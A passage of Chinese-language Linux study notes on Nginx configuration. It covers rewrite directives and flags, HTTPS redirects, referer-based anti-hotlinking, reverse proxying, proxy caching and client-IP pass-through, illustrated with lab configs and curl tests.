Nginx服务器利用 ngx_http_rewrite_module 模块解析和处理rewrite请求，此功能依靠 PCRE(perl compatible regular expression)，因此编译之前要安装PCRE库，rewrite是nginx服务器的重要功能之一，用于实现URL的重写，URL的重写是非常有用的功能，比如它可以在我们改变网站结构之后，不需要客户端修改原来的书签，也无需其他网站修改我们的链接，就可以设置为访问，另外还可以在一定程度上提高网站的安全性。





#2.命令参数
= #比较变量和字符串是否相等，相等时if指令认为该条件为true，反之为false
!=  #比较变量和字符串是否不相等，不相等时if指令认为条件为true，反之为false
~ #区分大小写字符，可以通过正则表达式匹配，满足匹配条件为真，不满足匹配条件为假
!~ #区分大小写字符,判断是否匹配，不满足匹配条件为真，满足匹配条件为假
~* #不区分大小写字符，可以通过正则表达式匹配，满足匹配条件为真，不满足匹配条件为假
!~* #不区分大小字符,判断是否匹配，满足匹配条件为假，不满足匹配条件为真
-f 和 !-f #判断请求的文件是否存在和是否不存在
-d 和 !-d #判断请求的目录是否存在和是否不存在
-x 和 !-x #判断文件是否可执行和是否不可执行
-e 和 !-e #判断请求的文件或目录是否存在和是否不存在(包括文件，目录，软链接)





#3.if指令
location /main {
     index index.html;
     default_type text/html; 
     if ( $scheme = http ){  #$scheme判断协议
       echo "if-----> $scheme";
     }
     if ( $scheme = https ){
      echo "if ----> $scheme";
   }
    
     #if (-f $request_filename) {
     #   echo "$request_filename is exist";
     #}
     if (!-e $request_filename) {
        echo "$request_filename is not exist";
        #return 301 /index.html;  #如果输入的网页不存在，自动跳到主页面
   }
 }
 
 
 
 
#4.return指令

#4.1概述
return用于完成对请求的处理，并直接向客户端返回响应状态码，比如:可以指定重定向URL(对于特殊重定向状态码，301/302等) 或者是指定提示文本内容(对于特殊状态码403/500等)，处于此指令后的所有配置都将不被执行，return可以在server、if 和 location块进行配置


#4.2语法格式：
return code; #返回给客户端指定的HTTP状态码
return code [text]; #返回给客户端的状态码及响应报文的实体内容，可以调用变量,其中text如果有空格,需要用单或双引号
return code URL; #返回给客户端的URL地址



#4.3案例
location /test {
   root /data/nginx/html/pc;
      default_type text/html;
      #default_type text/plain; #文本格式
   index index.html;
      if ( $scheme = http ){
        #return 666;
        #return 666 "not allow http";
        #return 301 http://www.baidu.com; #永久重定向
        #return 302 http://www.baidu.com; #临时重定向
       return 500 "service error";
        echo "if-----> $scheme"; #return后面的将不再执行
     }
     if ( $scheme = https ){
      echo "if ----> $scheme";
   }
}





#5.set 指令(变量赋值)
指定key并给其定义一个变量，变量可以调用Nginx内置变量赋值给key，另外set定义格式为set $key value，value可以是text, variables和两者的组合。

#5.1案例：
location /main {
   root /data/nginx/html/pc;
   index index.html;
   default_type text/html;
    set $name magedu;
    echo $name;
    set $my_port $server_port;
    echo $my_port;
}




#6.break 指令

#6.1概述
用于中断当前相同作用域(location)中的其他Nginx配置，与该指令处于同一作用域的Nginx配置中，位于它前面的配置生效，位于后面的 ngx_http_rewrite_module 模块中指令就不再执行，Nginx服务器在根据配置处理请求的过程中遇到该指令的时候，回到上一层作用域继续向下读取配置，该指令可以在server块和locationif块中使用。

注意: 如果break指令在location块中后续指令还会继续执行,只是不执行 ngx_http_rewrite_module 模块的指令,其它指令还会执行。

Module ngx_http_rewrite_module
Directives
     break
     if
     return
     rewrite
     rewrite_log
     set


#6.2案例：
location /main {
   root /data/nginx/html/pc;
   index index.html;
   default_type text/html;
   set $name magedu;
   echo $name;
   break;  #location块中break后面指令还会执行
   set $my_port $server_port; #不执行
   echo $my_port; #执行
 }
 
 
 
 

#7.rewrite_log 指令

#7.1概述
设置是否开启记录ngx_http_rewrite_module 模块日志记录到 error_log日志文件当中，可以配置在http、server、location或 if中，注意: 需要日志级别为notice。


#7.2案例：
 location /main {
     index index.html;
     default_type text/html;
     set $name liusenbiao;
     echo $name;
     rewrite_log on;
     break;
     set $my_port $server_port;
     echo $my_port;
 }
 
#重启nginx，访问并验证error_log：
[root@centos8 ~]# tail -f /apps/nginx/logs/error.log 
2020/02/27 15:10:02 [warn] 5815#0: *3 using uninitialized "my_port" variable, 
client: 10.0.0.1, server: www.magedu.org, request: "GET /main HTTP/1.1", host: 
"www.magedu.org
```

#### 41.6.2rewrite指令

```
#1.概述
通过正则表达式的匹配来改变URI，可以同时存在一个或多个指令，按照顺序依次对URI进行匹配，rewrite主要是针对用户请求的URL或者是URI做具体处理

rewrite可以配置在 server、location、if
rewrite将用户请求的URI基于regex所描述的模式进行检查，匹配到时将其替换为表达式指定的新的URI

注意：如果在同一级配置块中存在多个rewrite规则，那么会自下而下逐个检查;被某条件规则替换完成后，会重新一轮的替换检查，隐含有循环机制,但不超过10次;如果超过，提示500响应码，[flag]所表示的标志位用于控制此循环机制

如果替换后的URL是以http://或https://开头，则替换结果会直接以重定向返回给客户端, 即永久重定向 301





#2.正则表达式格式
. #匹配除换行符以外的任意字符
\w #匹配字母或数字或下划线或汉字
\s #匹配任意的空白符
\d #匹配数字
\b #匹配单词的开始或结束
^ #匹配字付串的开始
$ #匹配字符串的结束
* #匹配重复零次或更多次
+ #匹配重复一次或更多次
? #匹配重复零次或一次
(n) #匹配重复n次
{n,} #匹配重复n次或更多次
{n,m} #匹配重复n到m次
*? #匹配重复任意次，但尽可能少重复
+? #匹配重复1次或更多次，但尽可能少重复
?? #匹配重复0次或1次，但尽可能少重复
{n,m}? #匹配重复n到m次，但尽可能少重复
{n,}? #匹配重复n次以上，但尽可能少重复
\W  #匹配任意不是字母，数字，下划线，汉字的字符
\S #匹配任意不是空白符的字符
\D #匹配任意非数字的字符
\B #匹配不是单词开头或结束的位置
[^x] #匹配除了x以外的任意字符
[^liusenbiao] #匹配除了liusenbiao 这几个字母以外的任意字符
```

##### 41.6.2.1rewrite flag使用介绍

```
#1.概述
利用nginx的rewrite的指令，可以实现url的重新跳转，rewrtie有四种不同的flag，分别是redirect(临时重定向302)、permanent(永久重定向301)、break和last。其中前两种是跳转型的flag，后两种是代理型

     1.1 跳转型指由客户端浏览器重新对新地址进行请求
     1.2 代理型是在WEB服务器内部实现跳转
     
     



#2.flag说明
redirect;
#临时重定向，重写完成后以临时重定向方式直接返回重写后生成的新URL给客户端，由客户端重新发起请求;使用相对路径,或者http://或https://开头，状态码：302

permanent;
#重写完成后以永久重定向方式直接返回重写后生成的新URL给客户端，由客户端重新发起请求，状态码：301

break;
#重写完成后,停止对当前URL在当前location中后续的其它重写操作，而后直接跳转至重写规则配置块之后的其它配置;结束循环，建议在location中使用
#适用于一个URL一次重写

last;
#重写完成后,停止对当前URI在当前location中后续的其它重写操作，而后对新的URL启动新一轮重写检查，不建议在location中使用
#适用于一个URL多次重写，要注意避免出现超过十次以及URL重写后返回错误的给用户






#3.rewrite案例: 域名永久与临时重定向
域名的临时的调整，后期可能会变，之前的域名或者URL可能还用、或者跳转的目的域名和URL还会跳转，这种情况浏览器不会缓存跳转,临时重定向不会缓存域名解析记录(A记录)，但是永久重定向会缓存。

示例: 因业务需要，将访问源域名 www.liusenbiao.org 的请求永久重定向到 www.liusenbiao.com

#3.1创建文件夹
[root@centos7 pc]# mkdir beijing
[root@centos7 pc]# echo welcome to beijing,this is permanent redirect > /data/nginx/html/pc/index.html



#3.2配置pc.conf
[root@centos7 ~]# vim /apps/nginx/conf.d/pc.conf
    location /bj {
    rewrite ^/bj/(.*) /beijing/$1 permanent;  #以bj开头URL的永久重定向到beijing的URL
}
[root@centos7 pc]# nginx -s reload




#3.3实现整个域名的跳转
[root@centos7 beijing]# vim /apps/nginx/conf.d/pc.conf
    location / {
      root /data/nginx/html/pc/;
      rewrite / http://www.shuaige.org permanent;
   }

server {
   listen 80;
    server_name www.shuaige.org;
    root /data/nginx/html/shuaige/;
}



#创建新的域名对应的文件夹
[root@centos7 beijing]# cd /data/nginx/html/
[root@centos7 html]# mkdir shuaige
[root@centos7 html]# echo this is shuaige blog > /data/nginx/html/shuaige/index.html
[root@centos7 conf.d]# nginx -s reload
```

**域名跳转前：**

![1656234277824](linux体系.assets/1656234277824.png)

**域名跳转后：**

![1656234363234](linux体系.assets/1656234363234.png)

##### 41.6.2.2break案例

```
#break测试案例：当客户端访问break的时候，测试通过rewrite将URL重写为test1，然后再通过rewrite将test1重写为test2测试两条write规则最终哪一条生效，并且测试重写后的URL会不会到其他location重新匹配

[root@centos8 ~]#vim /apps/nginx/conf.d/pc.conf 
   location /break {
      #return 666 "break";
     root /data/nginx;
     index index.html;
     rewrite ^/break/(.*) /test1/$1 break;  #break匹配成功后不再向下匹配，也不会跳转到其他的location，即直接结束匹配并给客户端返回结果数据。
     rewrite ^/test1/(.*) /test2/$1 break;  #break不会匹配后面的rewrite规则也不匹配location
   }
   
   location   /test1 {
      echo "new test1";
     return 999 "new test1";
   }
     location   /test2 {
      echo "new test2";
     return 666 "new test2";
   }
     
#创建资源路径：
[root@centos8 ~]# mkdir /data/nginx/break
[root@centos8 ~]# mkdir /data/nginx/test1
[root@centos8 ~]# mkdir /data/nginx/test2
[root@centos8 ~]# echo break > /data/nginx/break/index.html 
[root@centos8 ~]# echo test1 > /data/nginx/test1/index.html 
[root@centos8 ~]# echo test2 > /data/nginx/test2/index.html 

#break访问测试：
[root@centos7 ~]#curl -i www.magedu.org/break/index.html 
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 08 Oct 2020 14:16:22 GMT
Content-Type: text/html
Content-Length: 6
Last-Modified: Thu, 08 Oct 2020 14:08:47 GMT
Connection: keep-alive
ETag: "5f7f1d6f-6"
Accept-Ranges: bytes
test1
#最终的结果不会超出break的location而且不会继续匹配当前location后续的write规则，而且直接返回
数据给客户端。
```

break适用于不改变客户端访问方式，但是要将访问的目的URL做单次重写的场景，比如:有V1/V2两个版本的网站前端页面并存，旧版本的网站数据在statics,还不能丢失，但是要将访问新版本的请求重写到新的静态资源路static

```
location /statics {  #旧路径重写至新路径,再响应
     root /data/nginx;
     index index.html;
     rewrite ^/statics/(.*) /static/$1 break;
}

location /static {  #新路径也可以直接响应请的请求
 root /data/nginx;
 index index.html;
}
```

##### 41.6.2.3last案例

```
last：对某个location的URL匹配成功后,会停止当前location的后续rewrite规则，并结束当前location，然后将匹配生成的新URL跳转至其他location继续匹配，直到没有location可匹配后, 将最后一次location的数据返回给客户端。
last 适用于要不改变客户端访问方式但是需做多次目的URL重写的场景，使用场景不是很多。



[root@centos8 ~]#vim /apps/nginx/conf.d/pc.conf
     location /test2 {
       return 666 "new test2";
       #echo "new test2";
     }
     location /test1 {
      #return 999 "new test1";
      #echo "new test1";
     rewrite ^/test1/(.*) /test2/$1 last;
   }
   location /last {
     root /data/nginx;
     index index.html;
     rewrite ^/last/(.*) /test1/$1 last;
     rewrite ^/test1/(.*) /test2/$1 last; #如果第一条rewrite规则匹配成功则不执行本条，否则执行本条rewrite规则。
   }
   
#last访问测试：
[root@centos8 ~]#curl   -L   http://www.magedu.org/last/index.html
new test2 #会匹配多个location，直到最终全部匹配完成，返回最后一个location的匹配结果给客户端。
```

##### 41.6.2.4 break和last区别

```
break匹配成功后不再向下匹配，也不会跳转到其他的location，即直接结束匹配并给客户端返回结果数据。

last：对某个location的URL匹配成功后,会停止当前location的后续rewrite规则，并结束当前location，然后将匹配生成的新URL跳转至其他location继续匹配，直到没有location可匹配后, 将最后一次location的数据返回给客户端。
```

##### 41.6.2.5自动跳转https

```
#1.修改子配置文件
[root@centos8 ~]# vim /apps/nginx/conf.d/pc.conf
server {
 listen 443 ssl;
 listen 80;
 ssl_certificate /apps/nginx/conf.d/ssl/www.liusenbiao.org.crt;
 ssl_certificate_key /apps/nginx/conf.d/ssl/www.liusenbiao.org.key;
 ssl_session_cache shared:sslcache:20m;
 ssl_session_timeout 10m;
 server_name www.liusenbiao.org;
 
    location / {
       root /data/nginx/html/pc/;
       if ($scheme = http ) {
          rewrite .* https://www.liusenbiao.org/ permanent;
      }
   }
 
 location /login {     #针对特定的URL进行跳转https 
 if ($scheme = http ){  #如果没有加条件判断，会导致死循环
   rewrite / https://$host/login redirect;
      }
   }
}



#2.创建密钥证书

#2.1创建ssl文件夹
[root@centos7 pc]# cd  /apps/nginx/conf.d/
[root@centos7 conf.d]# mkdir ssl
[root@centos7 conf.d]# cd ssl





#2.2一键创建证书脚本
[root@centos7 ssl]# vim certificate.sh
#!/bin/bash
#
#********************************************************************
#FileName：             certificate.sh
#URL:                   http://www.liwenliang.org
#Copyright (C):         2020 All rights reserved
#********************************************************************
CA_SUBJECT="/O=liusenbiao/CN=ca.liusenbiao.org"
SUBJECT="/C=CN/ST=henan/L=zhengzhou/O=liusenbiao/CN=www.liusenbiao.org"
SERIAL=34
EXPIRE=202002
FILE=liusenbiao.org

openssl req  -x509 -newkey rsa:2048 -subj $CA_SUBJECT -keyout ca.key -nodes -days 202002 -out ca.crt

openssl req -newkey rsa:2048 -nodes -keyout ${FILE}.key  -subj $SUBJECT -out ${FILE}.csr

openssl x509 -req -in ${FILE}.csr  -CA ca.crt -CAkey ca.key -set_serial $SERIAL  -days $EXPIRE -out ${FILE}.crt

chmod 600 ${FILE}.key ca.key






#2.3将服务器证书和ca证书整合在一起
[root@centos7 ssl]# bash certificate.sh
[root@centos7 ssl]# ls
ca.crt  certificate.sh      liusenbiao.org.csr
ca.key  liusenbiao.org.crt  liusenbiao.org.key
[root@centos7 ssl]# cat liusenbiao.org.crt ca.crt > www.liusenbiao.org.crt
[root@centos7 ssl]# mv liusenbiao.org.key www.liusenbiao.org.key
[root@centos7 ssl]# ll www.liusenbiao.org.*
-rw-r--r-- 1 root root 2275 Jun 26 03:36 www.liusenbiao.org.crt
-rw------- 1 root root 1704 Jun 26 03:28 www.liusenbiao.org.key
[root@centos7 pc]# nginx -s reload
```

![1656239437065](linux体系.assets/1656239437065.png)

![1656239458068](linux体系.assets/1656239458068.png)

##### 41.6.2.6 rewrite判断文件是否存在

```
#1.概念
当用户访问到公司网站的时输入了一个错误的URL，可以将用户重定向至官网首页




#2.案例
[root@centos7 conf.d]# vim /apps/nginx/conf.d/pc.conf
    location / {
       root /data/nginx/html/pc/;
       if ($scheme = http ) {
          rewrite .* https://www.liusenbiao.org/ permanent;
      }
      if (!-e $request_filename) {
          rewrite .* https://www.liusenbiao.org/index.html;
      }
   }   
[root@centos7 conf.d]# nginx -s reload




#3.其余业务场景
#案例1:如果客户端浏览器包含MSIE，则rewrite客户端请求到/msie目录下
if ( $http_user_agent ~ MSIE){
 rewrite ^(.*)$ /msie/$1 break;
} 
 
#案例2: 更换目录访问方式,目录转换为对象存储形式
#要求:
#/20200106/static ->/static?id=20200106
#/20200123/image ->/image?id=20200123
rewrite ^/(\d+)/(.+)/   /$2?id=$l last;

#案例3:多目录转换访问方式
#要求: www.magedu.com/images/20200106/1.jpg => www.magedu.com/index.do?
name=images&dir=20200106=&file=1.jpg
#规则配置:
if ($host ~* (.*)\.magedu\.com) {
 rewrite ^/(.*)/(\d+)/(.*)$   /index.do?name=$1&dir=$2&file=$3 last;
}
```

**访问不存在的页面**

![1656240514494](linux体系.assets/1656240514494.png)

**成功跳转**

![1656240602083](linux体系.assets/1656240602083.png)

#### 41.6.3Nginx防盗

##### 41.6.3 .1实现盗链

```
#1.盗链的概述
防盗链基于客户端携带的referer实现，referer是记录打开一个页面之前记录是从哪个页面跳转过来的标记信息，如果别人只链接了自己网站图片或某个单独的资源，而不是打开了网站的整个页面，这就是盗链，referer就是之前的那个网站域名，正常的referer信息有以下几种：

none：#请求报文首部没有referer首部，比如用户直接在浏览器输入域名访问web网站，就没有referer信息。
blocked：#请求报文有referer首部，但无有效值，比如为空。
server_names：#referer首部中包含本主机名及即nginx 监听的server_name。
arbitrary_string：#自定义指定字符串，但可使用*作通配符。示例: *.magedu.org www.liusenbiao.*
regular expression：#被指定的正则表达式模式匹配到的字符串,要使用~开头，例如：~.*\.liusenbiao\.com




#2.案例：

#10.0.0.67上
[root@centos7 pc]# cd /data/nginx/html/pc
#从桌面上上传一个架构图.png的图片
[root@centos7 pc]# mv 架构图.png a.png




#10.0.0.8上
[root@centos8 ~]# cd /apps/nginx/html/
[root@centos8 html]# vim daolian.html
<html>
<head>  
<meta http-equiv=Content-Type content="text/html;charset=utf-8">
<title>盗链</title>
</head>
<body>
<img src="https://www.liusenbiao.org/a.png" >
</body>
</html>
```

![1656246052555](linux体系.assets/1656246052555.png)

##### 41.6.3.1 实现防盗链

```
[root@centos7 conf.d]# vim /apps/nginx/conf.d/pc.conf   
   location / {
       root /data/nginx/html/pc/;
       valid_referers none blocked server_names
        *.liusenbiao.org liusenbiao.*  ~\.google\.  ~\.baidu\.;
      if ($invalid_referer) {
         return 403;
      }
   }
[root@centos7 conf.d]# nginx -s reload
```

**修改hosts文件**

![1656249979962](linux体系.assets/1656249979962.png)

**规定范围外的不允许访问**

![1656249603565](linux体系.assets/1656249603565.png)

**规定www.baidu.com就允许访问**

![1656249766964](linux体系.assets/1656249766964.png)

### 41.7Nginx反向代理

```
#1.概述：
反向代理：reverse proxy，指的是代理外网用户的请求到内部的指定的服务器，并将数据返回给用户的一种方式，这是用的比较多的一种方式。
Nginx 除了可以在企业提供高性能的web服务之外，另外还可以将 nginx 本身不具备的请求通过某种预定义的协议转发至其它服务器处理，不同的协议就是Nginx服务器与其他服务器进行通信的一种规范，主要在不同的场景使用以下模块实现不同的功能
总结起来一句话：正向代理给客户端提供服务，反向代理给服务器端提供服务。
```

**生产环境部署：**

![1656377666283](linux体系.assets/1656377666283.png)

#### 41.7.1实现 http反向代理

##### 41.7.1.1反向代理配置参数

```
#官方文档：https://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_pass 

proxy_pass; 
#用来设置将客户端请求转发给的后端服务器的主机，可以是主机名(将转发至后端服务做为主机头首部)、IP地址：端口的方式
#也可以代理到预先设置的主机群组，需要模块ngx_http_upstream_module支持
一句话总结：正向代理是为客户端提供服务，反向代理是为服务器端提供服务，是为了实现负载均衡的调度的
 
proxy_pass_header field;
#默认nginx在响应报文中不传递后端服务器的首部字段Date, Server, X-Pad, X-Accel等参数，如果要传递的话则要使用 proxy_pass_header field声明将后端服务器返回的值传递给客户端
#field 首部字段大小不敏感

#示例:透传后端服务器的Server和Date首部,同时不再显示前端服务器的Server字段
proxy_pass_header Server;
proxy_pass_header Date;


proxy_pass_request_body on | off; 
#是否向后端服务器发送HTTP实体部分,可以设置在http,server或location块，默认即为开启

proxy_pass_request_headers on | off; 
#是否将客户端的请求头部转发给后端服务器，可以设置在http,server或location块，默认即为开启

proxy_set_header; 
#可更改或添加客户端的请求头部信息内容并转发至后端服务器，比如在后端服务器想要获取客户端的真实IP
的时候，就要更改每一个报文的头部

proxy_set_header X-Real-IP  $remote_addr;  
#添加HOST到报文头部，如果客户端为NAT上网那么其值为客户端的共用的公网IP地址，常用于在日之中记录
客户端的真实IP地址。
#在后端httpd服务器修改配置,添加日志记录X-Forwarded-For字段

proxy_connect_timeout time;
#配置nginx服务器与后端服务器尝试建立连接的超时时间，默认为60秒，用法如下：

proxy_connect_timeout 6s; 
#60s为自定义nginx与后端服务器建立连接的超时时间,超时会返回客户端504响应码

proxy_read_timeout time;
#配置nginx服务器向后端服务器或服务器组发起read请求后，等待的超时时间，默认60s

proxy_send_timeout time; 
#配置nginx项后端服务器或服务器组发起write请求后，等待的超时 时间，默认60s

proxy_http_version 1.0; 
#用于设置nginx提供代理服务的HTTP协议的版本，默认http 1.0

proxy_ignore_client_abort off; 
#当客户端网络中断请求时，nginx服务器中断其对后端服务器的请求。即如果此项设置为on开启，则服务器
会忽略客户端中断并一直等着代理服务执行返回，如果设置为off，则客户端中断后Nginx也会中断客户端请
求并立即记录499日志，默认为off。

proxy_headers_hash_bucket_size 128; 
#当配置了 proxy_hide_header和proxy_set_header的时候，用于设置nginx保存HTTP报文头的hash表的上限

proxy_headers_hash_max_size 512; 
#设置proxy_headers_hash_bucket_size的最大可用空间

server_namse_hash_bucket_size 512; 
#server_name hash表申请空间大小

server_names_hash_max_size  512; 
#设置服务器名称hash表的上限大小
```

##### 41.7.1.2反向代理单台 web服务器

![1656379118161](linux体系.assets/1656379118161.png)

```
#10.0.0.8
[root@centos8 ~]# vim /apps/nginx/conf/conf.d/pc.conf
server {
      listen 80;
      server_name www.liusenbiao.org;
      root /data/nginx/html/pc/;

  location / {
       root /data/nginx/html/pc/;
       proxy_pass http://10.0.0.18;  #反向代理到10.0.0.18上
    }
}
[root@centos7 conf.d]# nginx -s reload




#10.0.0.18上
[root@centos8 ~]# yum -y install httpd
[root@centos8 ~]# nginx -s quit
[root@centos8 ~]# echo rs1 server > /var/www/html/index.html
[root@centos8 ~]# systemctl start httpd



#10.0.0.7上访问
#nginx反向代理成功！！！
[17:08:23 root@centos7 ~]#curl www.liusenbiao.org
rs1 server
```

##### 41.7.1.3 指定 location实现反向代理

![1656407581961](linux体系.assets/1656407581961.png)

**10.0.0.8:**

```
#1.目标
针对特定URL的转发，如果访问的是www.magedu.org/api,转发到10.0.0.18这台机器上



#设置pc.conf的配置文件
[root@centos7 ~]# vim /apps/nginx/conf.d/pc.conf
server {
      listen 80;
      server_name www.liusenbiao.org;
    location / {
       root /data/nginx/html/pc/;
       proxy_pass http://10.0.0.8;
   }
    location /api {  
        proxy_pass http://10.0.0.18:8080; #特定URL转发，访问的是10.0.0.18:8080/api
        proxy_pass http://10.0.0.18:8080/;#直接访问的是主页面，不在追加uri
}

[root@centos7 ~]# nginx -s reload
```

**10.0.0.18：**

```
root@centos8_1:~# systemctl start httpd
root@centos8_1:~# cd /var/www/html/
root@centos8_1:/var/www/html# mkdir api
root@centos8_1:/var/www/html# echo api server > api/index.html
root@centos8_1:/var/www/html# echo index.html > index.html
```

**10.0.0.7：client**

```
[17:35:10 root@centos7 ~]#curl www.liusenbiao.org/api/
#ningx反向代理特定URL成功
#proxy_pass http://10.0.0.18:8080
api server
[17:44:22 root@centos7 ~]#curl www.liusenbiao.org/api/
#proxy_pass http://10.0.0.18:8080/
index.html
```

##### 41.7.1.4指定静态服务器

![1656411057321](linux体系.assets/1656411057321.png)

**10.0.0.8：proxy**

```
[root@proxy ~]# vim /apps/nginx/conf.d/pc.conf
server {
      listen 80;
      server_name www.liusenbiao.org;
      root /data/nginx/html/pc/;
      
    location / {
       root /data/nginx/html/pc/;
       proxy_pass http://10.0.0.8;
   }

    location /api {   #做动态服务器
       # proxy_pass http://10.0.0.18:8080;
        proxy_pass http://10.0.0.18:8080/;
  }

    location ~ \.(jpe?g|png|bmp|gif)$ { #做静态服务器
         proxy_pass http://10.0.0.28:80;
   }
}
```

**10.0.0.18:web1**

```

```

**10.0.0.28:web2**

```
#1.web2专门作为防止静态资源服务器
[root@web2 html]# yum -y install wget
[root@web2 ~]# wget https://pic.rmb.bdstatic.com/bjh/news/2455a7fc82c882bb67cdd7ef3b85e99e.png
[root@web2 ~]# mv 2455a7fc82c882bb67cdd7ef3b85e99e.png a.png
[root@web2 ~]# mv a.png /var/www/html/
[root@web2 html]# systemctl restart httpd
```

**访问动态服务器：**

![1656414887964](linux体系.assets/1656414887964.png)

**访问静态服务器：**

![1656415139248](linux体系.assets/1656415139248.png)

##### 41.7.1.5 Nginx缓存功能

```
proxy_cache zone_name | off; 默认off
#指明调用的缓存，或关闭缓存机制;Context:http, server,location
#zone_name 表示缓存的名称.需要由proxy_cache_path事先定义

proxy_cache_key string;
#缓存中用于“键”的内容，默认值：proxy_cache_key $scheme$proxy_host$request_uri;

proxy_cache_valid [code ...] time;
#定义对特定响应码的响应内容的缓存时长，定义在http{...}中
 示例:
 proxy_cache_valid 200 302 10m;
 proxy_cache_valid 404 1m;
 
 
proxy_cache_path;
#定义可用于proxy功能的缓存;Context:http 
proxy_cache_path path [levels=levels] [use_temp_path=on|off] 
keys_zone=zone_name:size [inactive=time] [max_size=size] [manager_files=number] 
[manager_sleep=time] [manager_threshold=time] [loader_files=number] 
[loader_sleep=time] [loader_threshold=time] [purger=on|off] 
[purger_files=number] [purger_sleep=time] [purger_threshold=time];


#示例：在http配置定义缓存信息
proxy_cache_path /var/cache/nginx/proxy_cache #定义缓存保存路径，proxy_cache会自动创建
   levels=1:2:2 #定义缓存目录结构层次，1:2:2可以生成2^4x2^8x2^8=2^20=1048576个目录
   keys_zone=proxycache:20m #指内存中缓存的大小，主要用于存放key和metadata（如：使用次数）   
   inactive=120s  #缓存有效时间  
   max_size=1g; #最大磁盘占用空间，磁盘存入文件内容的缓存空间最大值
   
   
#调用缓存功能，需要定义在相应的配置段，如server{...};或者location等
proxy_cache proxycache;
proxy_cache_key $request_uri; #对指定的数据进行MD5的运算做为缓存的key
proxy_cache_valid 200 302 301 10m; #指定的状态码返回的数据缓存多长时间
proxy_cache_valid any 1m;   #除指定的状态码返回的数据以外的缓存多长时间,必须设置,否则不会缓存


proxy_cache_use_stale error | timeout | invalid_header | updating | http_500 | 
http_502 | http_503 | http_504 | http_403 | http_404 | off ; #默认是off
#在被代理的后端服务器出现哪种情况下，可直接使用过期的缓存响应客户端

#示例
proxy_cache_use_stale error http_502 http_503;

proxy_cache_methods GET | HEAD | POST ...;
#对哪些客户端请求方法对应的响应进行缓存，GET和HEAD方法总是被缓存
```

**非缓存场景压测**

```
[root@web2 html]# yum -y install httpd-tools
#准备后端httpd服务器
[root@centos8 app1]# pwd
/var/www/html/static
[root@centos8 static]# cat /var/log/messages > ./log.html #准备测试页面
[root@centos8 ~]# ab -n 2000 -c200 http://www.magedu.org/static/log.html
Concurrency Level:      200
Time taken for tests:   15.363 seconds
Complete requests:      2000
Failed requests:        0
Write errors:           0
Total transferred:      1486898000 bytes
HTML transferred:       1486316000 bytes
Requests per second:    130.18 [#/sec] (mean)
Time per request:       1536.342 [ms] (mean)
Time per request:       7.682 [ms] (mean, across all concurrent requests)
Transfer rate:          94513.36 [Kbytes/sec] received
```

**准备缓存配置**

```
#1.修改主配置文件nginx.conf
[root@proxy ~]# vim /apps/nginx/conf/nginx.conf
http {
    include       mime.types;
    #levels=1:1:1； 存放2^4*2^4*2^4=2^12个文件
    #proxy_cache_path /data/nginx/proxycache；只要/data/nginx/有，会帮你自动创建proxycache
    #inactive=120s 120秒过期
    #max_size=1g 目录里存放的数据最多不能超过1G
    proxy_cache_path /data/nginx/proxycache levels=1:1:1 keys_zone=proxycache:20m  inactive=120s max_size=1g;
    
}



#2.修改子配置文件
server {
      listen 80;
      proxy_cache proxycache; #开启缓存
      #proxy_cache off; #关闭缓存
      #proxy_cache_key $request_uri;
      proxy_cache_key $host$uri$is_args$args; #restful风格
      proxy_cache_valid 200 302 301 10m; #200，302，301缓存10分钟
      proxy_cache_valid any 5m; #其他的响应码缓存5分钟
      proxy_set_header clientip $remote_addr;
}
[root@proxy ~]# nginx -s reload
#此时 proxycache文件夹已经自动生成
[root@proxy ~]# ls /data/nginx/
html  proxycache



#3.测试缓存

#浏览器上输入http://www.liusenbiao.org/a.png
[root@proxy ~]# tree /data/nginx/
/data/nginx/
├── html
│   ├── mobile
│   │   └── index.html
│   ├── pc
│   │   ├── about
│   │   │   └── default.html
│   │   ├── admin
│   │   │   └── index.html
│   │   ├── a.png
│   │   ├── beijing
│   │   │   └── index.html
│   │   ├── error
│   │   │   └── 40x.html
│   │   ├── favicon.ico
│   │   ├── index.html
│   │   ├── liusenbiao
│   │   │   └── index.html
│   │   ├── liusenbiao.html
│   │   ├── m.html
│   │   └── news
│   │       └── index.html
│   └── shuaige
│       └── index.html
└── proxycache
    └── f
        └── 6
            └── 1
                └── e1623dfa3f20bbc2120ee8223e8a416f #缓存生成成功
```

##### 41.7.1.6添加头部报文信息

```
#1.概述
nginx基于模块ngx_http_headers_module可以实现对后端服务器响应给客户端的报文中添加指定的响应首部字段

#示例:
#建议工作上添加这三项！！！
add_header X-Via $server_addr; #当前nginx主机的IP
add_header X-Cache $upstream_cache_status; #是否缓存命中，MISS OR HIT
add_header X-Accel $server_name; #客户访问的域名
proxy_hide_header Last-Modified; #隐藏首部关键信息



#2.案例：
[root@proxy ~]# vim /apps/nginx/conf.d/pc.conf
server {
      listen 80;
      proxy_cache proxycache;
      #proxy_cache_key $request_uri;
      proxy_cache_key $host$uri$is_args$args;
      proxy_cache_valid 200 302 301 10m;
      proxy_cache_valid any 5m;
      proxy_set_header clientip $remote_addr;
      add_header X-Via $server_addr; #添加本地ip
      add_header server liusenbiao; #随意添加
}



#10.0.0.7上测试
[21:14:38 root@centos7 ~]#curl -I http://www.liusenbiao.org/a.png
HTTP/1.1 200 OK
Server: nginx/1.20.1
Date: Tue, 28 Jun 2022 13:17:46 GMT
Content-Type: image/png
Content-Length: 904286
Connection: keep-alive
Last-Modified: Mon, 27 Jun 2022 03:22:23 GMT
ETag: "dcc5e-5e2656daa39c0"
X-Via: 10.0.0.67
server: liusenbiao
Strict-Transport-Security: max-age=31536000; includeSubDomains
Accept-Ranges: bytes
```

![1656422490441](linux体系.assets/1656422490441.png)

##### 41.7.1.7 IP透传

![1656424859490](linux体系.assets/1656424859490.png)

**10.0.0.8**

```
#1.概述
所谓的高大上名词IP透传，就是让后端服务器看到真实的客户端的ip地址发来的请求，而不是看到代理服务器的地址。



#2.修改配置文件在报文头添加客户端ip
[root@proxy ~]# vim /apps/nginx/conf.d/pc.conf
server {
      listen 80;
      proxy_cache off;  #一定关闭缓存
      #proxy_cache_key $request_uri;
      proxy_cache_key $host$uri$is_args$args;
      proxy_cache_valid 200 302 301 10m;
      proxy_cache_valid any 5m;
      proxy_set_header clientip $remote_addr;
      add_header X-Via $server_addr;
      add_header server liusenbiao;
      proxy_hide_header Last-Modified;
      proxy_set_header X-Real-IP $remote_addr; #添加客户端ip地址
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 
      #添加客户端IP到报文头部等同于proxy_set_header X-Real-IP $remote_addr
}
```

**10.0.0.18**

```
